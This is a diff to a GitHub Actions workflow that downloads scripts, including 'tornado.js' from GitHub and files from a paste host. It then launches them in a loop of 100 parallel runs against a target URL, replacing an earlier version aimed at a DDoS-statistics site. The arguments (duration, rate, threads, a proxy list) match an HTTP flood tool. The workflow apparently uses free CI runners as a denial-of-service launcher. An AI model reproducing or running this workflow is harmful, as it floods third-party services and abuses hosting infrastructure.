@@ -1,4 +1,4 @@
-name: Ubuntu VDS 50 saniye zeus
+  name: Ubuntu VDS 50 saniye tornada
 
 on:
   workflow_dispatch:
@@ -15,14 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/eoors/raww.js
-          wget https://curl.by/4W4K-/Test.py
-          chmod +x raww.js
-          chmod +x Test.py
+          wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
+          wget https://curl.by/cBwSY/fres.txt
+          npm i hpack
+          chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 100 python3 Test.py https://dstat.hexbear.xyz/xd && node raww.js https://dstat.hexbear.xyz/xd 100
+            timeout 75 node tornado.js GET https://l7waf.com/ 70 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -31,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 100
+        run: sleep 75
         
       - name: OK !
         run: sudo reboot
